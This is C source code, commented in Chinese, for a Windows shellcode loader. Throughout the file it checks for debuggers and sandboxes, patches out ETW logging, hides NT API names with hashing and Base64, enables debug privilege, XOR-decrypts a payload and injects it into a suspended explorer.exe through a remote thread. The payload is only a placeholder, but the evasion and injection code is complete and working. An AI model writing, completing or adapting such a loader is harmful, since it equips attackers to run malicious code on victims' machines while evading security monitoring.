#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

// 调试输出宏（DEBUG 模式下启用）
#define DEBUG_PRINT(fmt, ...) {                   \
    char dbg_buffer[256] = {0};                     \
    sprintf_s(dbg_buffer, sizeof(dbg_buffer), "[DEBUG] " fmt "\n", __VA_ARGS__); \
    OutputDebugStringA(dbg_buffer);                 \
    printf("[DEBUG] " fmt "\n", __VA_ARGS__);       \
}

// 一个简单的 Base64 解码函数（仅供参考，未处理所有错误情况）
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_char_value(char c) {
    const char* p = strchr(base64_table, c);
    return p ? (int)(p - base64_table) : -1;
}

char* base64_decode(const char* data, size_t* out_len) {
    size_t len = strlen(data);
    if (len % 4 != 0) return NULL; // 格式错误

    size_t padding = 0;
    if (len >= 1 && data[len - 1] == '=') padding++;
    if (len >= 2 && data[len - 2] == '=') padding++;

    *out_len = (len / 4) * 3 - padding;
    char* decoded = (char*)malloc(*out_len + 1);
    if (!decoded) return NULL;

    size_t i = 0, j = 0;
    while (i < len) {
        int a = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int b = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int c = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int d = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;

        decoded[j++] = (char)((a << 2) | (b >> 4));
        if (j < *out_len) decoded[j++] = (char)(((b & 15) << 4) | (c >> 2));
        if (j < *out_len) decoded[j++] = (char)(((c & 3) << 6) | d);
    }
    decoded[*out_len] = '\0';
    return decoded;
}

#define XOR_KEY 0xAA

// 原有 NT API 哈希值定义
DWORD HASH_NtAllocateVirtualMemory;
DWORD HASH_NtProtectVirtualMemory;
DWORD HASH_NtCreateThreadEx;
DWORD HASH_RtlCopyMemory;

// 新增哈希定义（虽然本例中不再使用 NtGetContextThread、NtSetContextThread、NtUnmapViewOfSection、NtResumeThread）
DWORD HASH_NtGetContextThread;
DWORD HASH_NtSetContextThread;
DWORD HASH_NtUnmapViewOfSection;
DWORD HASH_NtResumeThread;
// 进程注入时需要用到的写内存函数
DWORD HASH_NtWriteVirtualMemory;

// 更新后的 NT API 表结构（新增的 API 成员也会解析，但本例仅使用部分接口）
typedef struct _NtApiTable {
    FARPROC NtAllocateVirtualMemory;
    FARPROC NtProtectVirtualMemory;
    FARPROC NtCreateThreadEx;
    FARPROC RtlCopyMemory;
    FARPROC NtGetContextThread;
    FARPROC NtSetContextThread;
    FARPROC NtUnmapViewOfSection;
    FARPROC NtResumeThread;
    FARPROC NtWriteVirtualMemory;
} NtApiTable;

// 反沙箱检查：检测物理内存、处理器核心数以及常见沙箱模块（例如 Sandboxie）
BOOL AntiSandbox() {
    MEMORYSTATUSEX memInfo = { 0 };
    memInfo.dwLength = sizeof(memInfo);
    if (!GlobalMemoryStatusEx(&memInfo)) {
        DEBUG_PRINT("GlobalMemoryStatusEx call failed", 0);
        return TRUE; // 失败时认为处于沙箱环境
    }
    if ((memInfo.ullTotalPhys / (1024 * 1024)) < 2048) {
        DEBUG_PRINT("Insufficient physical memory: %llu MB", memInfo.ullTotalPhys / (1024 * 1024));
        return TRUE;
    }

    SYSTEM_INFO sysInfo = { 0 };
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        DEBUG_PRINT("Insufficient number of processor cores: %u", sysInfo.dwNumberOfProcessors);
        return TRUE;
    }
    // 检查 Sandboxie 模块
    if (GetModuleHandleA("SbieDll.dll") != NULL) {
        DEBUG_PRINT("Sandboxie module detected", 0);
        return TRUE;
    }
    return FALSE;
}

// 从指定文件读取数据，并返回缓冲区地址，同时将读取的字节数保存到 *size 中
unsigned char* loadShellcode(const char* filename, size_t* size) {
    FILE* file;
    fopen_s(&file, filename, "rb");
    if (!file) {
        perror("fopen");
        return NULL;
    }

    // 获取文件大小
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    // 为文件内容分配内存
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(file);
        fprintf(stderr, "Memory allocation failed!\n");
        return NULL;
    }

    // 读取文件内容到缓冲区
    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != fileSize) {
        free(buffer);
        fclose(file);
        fprintf(stderr, "Failed to read file!\n");
        return NULL;
    }
    fclose(file);

    *size = fileSize;  // 返回文件长度
    return buffer;
}

// 反调试检查：使用 IsDebuggerPresent 及 CheckRemoteDebuggerPresent
BOOL AntiDebug() {
    if (IsDebuggerPresent()) {
        DEBUG_PRINT("Debugger detected by IsDebuggerPresent", 0);
        return TRUE;
    }
    BOOL debuggerFound = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerFound) && debuggerFound) {
        DEBUG_PRINT("Debugger detected by CheckRemoteDebuggerPresent", 0);
        return TRUE;
    }
    return FALSE;
}

DWORD RtlHashString(CHAR* str) {
    DWORD hash = 0;
    while (*str) {
        // 转换为小写（如果字符是大写字母）
        CHAR c = *str;
        if (c >= 'A' && c <= 'Z')
            c += 0x20;
        // 轮转右 13 位
        hash = (hash >> 13) | (hash << (32 - 13));
        hash += c;
        str++;
    }
    return hash & 0x7FFFFFFF;
}

// 提权函数
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return result;
}

// 遍历 ntdll.dll 导出表，根据 Base64 编码的 API 名称设置各 API 的哈希值
void GetAllAPINames(HMODULE hModule) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* funcName = (CHAR*)((BYTE*)hModule + pNames[i]);
        DWORD hash = RtlHashString(funcName);
        size_t decLen = 0;
        if (!strcmp(funcName, base64_decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=", &decLen))) {
            HASH_NtAllocateVirtualMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==", &decLen))) {
            HASH_NtProtectVirtualMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRDcmVhdGVUaHJlYWRFeA==", &decLen))) {
            HASH_NtCreateThreadEx = hash;
        }
        else if (!strcmp(funcName, base64_decode("UnRsQ29weU1lbW9yeQ==", &decLen))) {
            HASH_RtlCopyMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRHZXRDb250ZXh0VGhyZWFk", &decLen))) {
            HASH_NtGetContextThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRTZXRDb250ZXh0VGhyZWFk", &decLen))) {
            HASH_NtSetContextThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRVbm1hcFZpZXdPZlNlY3Rpb24=", &decLen))) {
            HASH_NtUnmapViewOfSection = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRSZXN1bWVUaHJlYWQ=", &decLen))) {
            HASH_NtResumeThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk=", &decLen))) {
            HASH_NtWriteVirtualMemory = hash;
        }
    }
}

// 动态获取 API 地址：遍历导出表，对比计算后的哈希值
FARPROC GetAPI(HMODULE hModule, DWORD targetHash) {
    if (!hModule) {
        DEBUG_PRINT("Module handle is NULL", 0);
        return NULL;
    }

    // 检查 DOS 头有效性
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        DEBUG_PRINT("Invalid DOS signature", 0);
        return NULL;
    }

    // 获取 NT 头部
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DEBUG_PRINT("Invalid NT signature", 0);
        return NULL;
    }

    // 获取导出目录的 RVA
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) {
        DEBUG_PRINT("No export directory", 0);
        return NULL;
    }

    // 获取导出目录指针
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    if (numberOfNames == 0) {
        DEBUG_PRINT("No names in export table", 0);
        return NULL;
    }

    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* pFuncName = (CHAR*)((BYTE*)hModule + pNames[i]);
        if ((RtlHashString(pFuncName) & 0x7FFFFFFF) == targetHash) {
            DEBUG_PRINT("Resolved API: %s", pFuncName);
            WORD ordinal = pOrdinals[i];
            DWORD funcRVA = pFunctions[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    DEBUG_PRINT("No matching API found", 0);
    return NULL;
}

// 延迟执行（非 Sleep 调用）
void DelayExecution(DWORD ms) {
    DWORD start = GetTickCount();
    while ((GetTickCount() - start) < ms) {
        SwitchToThread();
    }
}

// 绕过 ETW 检测：将 EtwEventWrite 函数首字节替换为 RET 指令
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        *(PBYTE)pEtwEventWrite = 0xC3; // RET
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
        DEBUG_PRINT("ETW bypassed", 0);
    }
}

// 随机选择目标进程名称（仅选择常见系统进程名称，实际使用中请确保具有合法性）
const CHAR* GetRandomProcessName() {
    const CHAR* processes[] = {
        "explorer.exe"
    };
    return processes[GetTickCount() % (sizeof(processes) / sizeof(CHAR*))];
}

// --- 进程注入函数 ---
// 修改后不再修改目标进程主线程上下文，而是直接在目标进程中申请内存、写入 shellcode 并创建远程线程执行
BOOL ProcessInjection(NtApiTable* nt, PVOID shellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    PVOID remoteMem = NULL;
    SIZE_T memSize = shellcodeSize;
    NTSTATUS status;

    // 随机选择目标进程
    const CHAR* procName = GetRandomProcessName();

    // 创建挂起进程
    if (!CreateProcessA(
        NULL,
        (LPSTR)procName,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS,
        NULL, NULL, &si, &pi)) {
        DEBUG_PRINT("Failed to create process: %d", GetLastError());
        return FALSE;
    }

    // 在目标进程中分配内存
    status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))
        nt->NtAllocateVirtualMemory)(pi.hProcess, &remoteMem, 0, &memSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || !remoteMem) {
        DEBUG_PRINT("Failed to allocate memory in remote process: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // 写入 shellcode 到目标进程内存
    status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))
        nt->NtWriteVirtualMemory)(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL);
    if (status != 0) {
        DEBUG_PRINT("Failed to write to remote memory: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // 在目标进程中创建新线程以执行 shellcode
    HANDLE hThread = NULL;
    status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE,
        PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID))
        nt->NtCreateThreadEx)(&hThread, 0x1FFFFF, NULL, pi.hProcess,
            (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, 0, 0, 0, NULL);
    if (status != 0 || !hThread) {
        DEBUG_PRINT("Failed to create remote thread: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    DEBUG_PRINT("Successfully injected remote thread into process %s", procName);

    WaitForSingleObject(hThread, 1);

    return TRUE;
}

// --- 主加载函数 ---
// 反检测、解密、并全部通过远程进程注入执行 shellcode
void ExecuteShellcode() {
    // 反调试和反沙箱检查
    if (AntiDebug() || AntiSandbox()) {
        DEBUG_PRINT("Debugging/sandbox environment detected, exiting program", 0);
        ExitProcess(0);
    }

    // 绕过 ETW 监控
    BypassETW();

    // 延迟执行以躲避静态分析
    DelayExecution(5000);

    // 提权操作
    if (!EnableDebugPrivilege()) {
        DEBUG_PRINT("Failed to enable debug privilege", 0);
    }
    else {
        DEBUG_PRINT("Debug privilege enabled successfully", 0);
    }

    size_t shellcodeLen = 0;
    //unsigned char* encryptedShellcode = loadShellcode("encrypted_shellcode.data", &shellcodeLen);
	//your shellcode here
    unsigned char encryptedShellcode[] = {0xAA};
	shellcodeLen = sizeof(encryptedShellcode);
    if (!encryptedShellcode) {
        DEBUG_PRINT("Failed to load shellcode", 0);
        ExitProcess(0);
    }

    // 初始化 NT API 表
    NtApiTable nt = { 0 };
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        DEBUG_PRINT("Failed to get ntdll.dll", 0);
        ExitProcess(0);
    }
    GetAllAPINames(hNtdll);

    nt.NtAllocateVirtualMemory = GetAPI(hNtdll, HASH_NtAllocateVirtualMemory);
    nt.NtProtectVirtualMemory = GetAPI(hNtdll, HASH_NtProtectVirtualMemory);
    nt.NtCreateThreadEx = GetAPI(hNtdll, HASH_NtCreateThreadEx);
    nt.RtlCopyMemory = GetAPI(hNtdll, HASH_RtlCopyMemory);
    nt.NtWriteVirtualMemory = GetAPI(hNtdll, HASH_NtWriteVirtualMemory);
    // 虽然新增的 API 已解析，但本例中不再使用它们
    nt.NtGetContextThread = GetAPI(hNtdll, HASH_NtGetContextThread);
    nt.NtSetContextThread = GetAPI(hNtdll, HASH_NtSetContextThread);
    nt.NtUnmapViewOfSection = GetAPI(hNtdll, HASH_NtUnmapViewOfSection);
    nt.NtResumeThread = GetAPI(hNtdll, HASH_NtResumeThread);

    if (!nt.NtAllocateVirtualMemory || !nt.NtProtectVirtualMemory ||
        !nt.NtCreateThreadEx || !nt.RtlCopyMemory || !nt.NtWriteVirtualMemory) {
        DEBUG_PRINT("Failed to resolve NT APIs", 0);
        ExitProcess(0);
    }

    // 解密 shellcode（XOR 解密）
    for (unsigned int i = 0; i < shellcodeLen; i++) {
        encryptedShellcode[i] ^= XOR_KEY;
    }
    DEBUG_PRINT("Shellcode decrypted successfully", 0);

    // 全部采用远程注入方式，在目标进程中新创建线程执行 shellcode
    if (!ProcessInjection(&nt, encryptedShellcode, shellcodeLen)) {
        DEBUG_PRINT("Remote injection failed", 0);
        ExitProcess(0);
    }
}

// 程序入口点
void main() {
    DEBUG_PRINT("Starting shellcode execution", 0);
    ExecuteShellcode();
}
